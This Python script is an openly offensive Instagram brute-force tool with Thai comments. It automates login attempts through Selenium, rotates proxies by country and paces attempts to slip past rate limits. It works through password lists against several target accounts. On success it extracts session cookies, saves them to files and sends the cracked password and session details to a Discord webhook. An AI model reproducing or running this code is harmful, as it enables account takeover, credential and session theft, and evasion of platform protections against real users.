#!/usr/bin/env python3
"""
🔓 Enhanced Instagram Brute Force with Selenium Browser API Integration
รองรับ email/phone/username พร้อม proxy rotation และ session extraction
"""

import time
import json
import random
import requests
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from pathlib import Path

# Import existing modules
from modules.proxy_manager import ProxyManager
from modules.browser_api_manager import BrowserAPIManager
from webhook.discord_notify import send_discord_alert

class EnhancedInstagramBruteForce:
    """Enhanced Instagram Brute Force with Selenium Browser API Integration"""
    
    def __init__(self, config_file: str = "brute_config.json"):
        self.config = self.load_config(config_file)
        self.proxy_manager = ProxyManager()
        self.browser_api = BrowserAPIManager()
        
        # Session storage
        self.successful_sessions = []
        self.failed_attempts = []
        
        # Rate limiting
        self.request_delay = self.config.get('request_delay', 3)
        self.max_attempts_per_target = self.config.get('max_attempts', 10)
        self.max_concurrent = self.config.get('max_concurrent', 3)
        
        # Proxy management
        self.use_proxy = self.config.get('use_proxy', True)
        self.proxy_rotation_interval = self.config.get('proxy_rotation_interval', 5)
        self.current_proxy_attempts = 0
        
        # Browser management
        self.browser_sessions = {}
        self.max_browser_sessions = 3
        self.session_rotation_interval = 5
        
        print(f"🚀 Enhanced Instagram Brute Force initialized")
        print(f"   Proxy enabled: {self.use_proxy}")
        print(f"   Browser sessions: {self.max_browser_sessions}")
        print(f"   Session rotation: every {self.session_rotation_interval} attempts")
    
    def load_config(self, config_file: str) -> dict:
        """โหลดการตั้งค่าจากไฟล์ config"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            print(f"❌ Error loading config: {e}")
            return {}
    
    def get_browser_session(self, force_new: bool = False) -> BrowserAPIManager:
        """Get or create browser session with proxy rotation"""
        session_id = f"session_{len(self.browser_sessions) % self.max_browser_sessions}"
        
        if force_new or session_id not in self.browser_sessions or self.current_proxy_attempts >= self.session_rotation_interval:
            print(f"🌐 Creating new browser session: {session_id}")
            
            # Close existing session if exists
            if session_id in self.browser_sessions:
                try:
                    self.browser_sessions[session_id].close_session()
                except:
                    pass
            
            # Create new browser session
            browser = BrowserAPIManager()
            
            if self.use_proxy:
                # Get random proxy configuration
                countries = ['US', 'GB', 'CA', 'AU', 'DE', 'FR', 'NL', 'SG']
                country = random.choice(countries)
                browser.create_session(country=country)
                print(f"🌍 Browser session created with {country} proxy")
            else:
                browser.create_session()
                print(f"🔗 Browser session created without proxy")
            
            self.browser_sessions[session_id] = browser
            self.current_proxy_attempts = 0
            
        return self.browser_sessions[session_id]
    
    def attempt_login(self, target: str, password: str) -> Tuple[bool, Dict]:
        """ลองเข้าสู่ระบบด้วย Selenium Browser API"""
        print(f"🔓 Attempting login: {target} : {password}")
        
        result = {
            'target': target,
            'password': password,
            'success': False,
            'session_id': None,
            'user_id': None,
            'timestamp': datetime.now().isoformat(),
            'error': None,
            'proxy_used': self.use_proxy,
            'user_agent': 'Selenium Chrome Browser'
        }
        
        try:
            # Get browser session (rotates proxy automatically)
            browser = self.get_browser_session()
            
            # Attempt login using browser automation
            login_success = browser.login_instagram(target, password)
            
            if login_success:
                print(f"✅ Login successful for {target}")
                result['success'] = True
                
                # Extract session information
                try:
                    # Get cookies and session data
                    cookies = browser.driver.get_cookies()
                    session_data = {}
                    
                    for cookie in cookies:
                        if cookie['name'] in ['sessionid', 'csrftoken', 'ds_user_id', 'mid']:
                            session_data[cookie['name']] = cookie['value']
                    
                    if 'sessionid' in session_data:
                        result['session_id'] = session_data['sessionid']
                        print(f"📦 Session ID extracted: {session_data['sessionid'][:20]}...")
                    
                    if 'ds_user_id' in session_data:
                        result['user_id'] = session_data['ds_user_id']
                        print(f"👤 User ID: {session_data['ds_user_id']}")
                    
                    # Save full session data
                    self.save_session_data(target, session_data)
                    
                    # Send Discord notification for successful login
                    try:
                        discord_message = f"🎯 **ENHANCED BRUTE FORCE SUCCESS!**\n"
                        discord_message += f"**Target:** {target}\n"
                        discord_message += f"**Password:** ||{password}||\n"
                        discord_message += f"**Session ID:** {result['session_id'][:20]}...\n"
                        discord_message += f"**User ID:** {result['user_id']}\n"
                        discord_message += f"**Proxy Used:** {'✅' if self.use_proxy else '❌'}\n"
                        discord_message += f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        send_discord_alert(discord_message)
                    except Exception as e:
                        print(f"Failed to send Discord notification: {e}")
                    
                except Exception as e:
                    print(f"⚠️ Warning: Could not extract session data: {e}")
                
                return True, result
            else:
                print(f"❌ Login failed for {target}")
                result['error'] = 'Invalid credentials or blocked'
                return False, result
                
        except Exception as e:
            print(f"❌ Browser automation error: {e}")
            result['error'] = str(e)
            
            # Force new browser session on error
            try:
                self.get_browser_session(force_new=True)
            except:
                pass
            
            return False, result
    
    def save_session_data(self, target: str, session_data: dict):
        """บันทึกข้อมูล session ที่สำเร็จ"""
        session_info = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'session_data': session_data,
            'cookies': session_data
        }
        
        # Save to successful sessions list
        self.successful_sessions.append(session_info)
        
        # Save to file
        filename = f"successful_sessions_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = Path("output") / filename
        filepath.parent.mkdir(exist_ok=True)
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(session_info, f, indent=2, ensure_ascii=False)
            print(f"💾 Session data saved to: {filepath}")
        except Exception as e:
            print(f"❌ Error saving session data: {e}")
    
    def brute_force_target(self, target: str, passwords: List[str]) -> List[Dict]:
        """Brute force ตัวเป้าหมายเดียวด้วย password list"""
        print(f"\n🎯 Starting brute force attack on: {target}")
        print(f"📝 Passwords to try: {len(passwords)}")
        
        results = []
        successful_logins = 0
        
        for i, password in enumerate(passwords[:self.max_attempts_per_target], 1):
            print(f"\n[{i}/{min(len(passwords), self.max_attempts_per_target)}] Testing password: {password}")
            
            # Attempt login
            success, result = self.attempt_login(target, password)
            results.append(result)
            self.current_proxy_attempts += 1
            
            if success:
                successful_logins += 1
                print(f"🏆 Found valid credentials!")
                
                if self.config.get('stop_on_success', True):
                    print(f"⏹️ Stopping attack (found valid credentials)")
                    break
            else:
                # Add to failed attempts
                self.failed_attempts.append(result)
            
            # Rate limiting delay
            if i < len(passwords):
                delay = self.request_delay + random.uniform(0, 2)
                print(f"⏳ Waiting {delay:.1f}s before next attempt...")
                time.sleep(delay)
            
            # Rotate browser session periodically
            if self.current_proxy_attempts >= self.session_rotation_interval:
                print(f"🔄 Rotating browser session...")
                self.get_browser_session(force_new=True)
        
        print(f"\n📊 Attack completed for {target}")
        print(f"   Successful logins: {successful_logins}")
        print(f"   Total attempts: {len(results)}")
        
        return results
    
    def brute_force_multiple(self, targets: List[str], passwords: List[str]) -> Dict:
        """Brute force หลายตัวเป้าหมาย"""
        print(f"\n🎯 Starting multi-target brute force attack")
        print(f"👥 Targets: {len(targets)}")
        print(f"📝 Passwords per target: {min(len(passwords), self.max_attempts_per_target)}")
        
        all_results = {}
        total_successful = 0
        
        for target_idx, target in enumerate(targets, 1):
            print(f"\n{'='*60}")
            print(f"🎯 Target {target_idx}/{len(targets)}: {target}")
            print(f"{'='*60}")
            
            target_results = self.brute_force_target(target, passwords)
            all_results[target] = target_results
            
            # Count successful logins for this target
            target_success = sum(1 for r in target_results if r['success'])
            total_successful += target_success
            
            if target_success > 0:
                print(f"🏆 Found {target_success} valid credential(s) for {target}")
            
            # Delay between targets
            if target_idx < len(targets):
                delay = random.uniform(5, 10)
                print(f"⏳ Waiting {delay:.1f}s before next target...")
                time.sleep(delay)
        
        # Save comprehensive results
        self.save_results(all_results)
        
        print(f"\n🏁 ATTACK COMPLETED")
        print(f"   Total targets: {len(targets)}")
        print(f"   Total successful logins: {total_successful}")
        print(f"   Success rate: {(total_successful / len(targets) * 100):.1f}%")
        
        return all_results
    
    def save_results(self, results: dict):
        """บันทึกผลลัพธ์ทั้งหมด"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"enhanced_brute_results_{timestamp}.json"
        filepath = Path("output") / filename
        filepath.parent.mkdir(exist_ok=True)
        
        output_data = {
            'timestamp': timestamp,
            'config': self.config,
            'results': results,
            'summary': {
                'total_targets': len(results),
                'total_attempts': sum(len(target_results) for target_results in results.values()),
                'successful_logins': sum(
                    sum(1 for r in target_results if r['success']) 
                    for target_results in results.values()
                ),
                'proxy_used': self.use_proxy
            }
        }
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(output_data, f, indent=2, ensure_ascii=False)
            print(f"💾 Results saved to: {filepath}")
        except Exception as e:
            print(f"❌ Error saving results: {e}")
    
    def cleanup(self):
        """ทำความสะอาด browser sessions"""
        print(f"🧹 Cleaning up browser sessions...")
        for session_id, browser in self.browser_sessions.items():
            try:
                browser.close_session()
                print(f"   Closed session: {session_id}")
            except Exception as e:
                print(f"   Error closing session {session_id}: {e}")
        
        self.browser_sessions.clear()


def load_passwords(password_file: str) -> List[str]:
    """โหลด password list จากไฟล์"""
    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"📝 Loaded {len(passwords)} passwords from {password_file}")
        return passwords
    except Exception as e:
        print(f"❌ Error loading passwords: {e}")
        return []


def main():
    """ฟังก์ชันหลักสำหรับการทดสอบ"""
    print("🚀 Enhanced Instagram Brute Force Starting...")
    
    # Initialize brute force engine
    brute_force = EnhancedInstagramBruteForce()
    
    try:
        # Test configuration
        test_targets = ["test_user_123", "demo_account"]
        test_passwords = ["123456", "password", "admin", "test123"]
        
        print(f"\n🧪 Running test with {len(test_targets)} targets and {len(test_passwords)} passwords")
        
        # Run brute force attack
        results = brute_force.brute_force_multiple(test_targets, test_passwords)
        
        print(f"\n✅ Test completed successfully")
        
    except KeyboardInterrupt:
        print(f"\n⏹️ Attack stopped by user")
    except Exception as e:
        print(f"\n❌ Error during attack: {e}")
    finally:
        # Cleanup
        brute_force.cleanup()


if __name__ == "__main__":
    main()
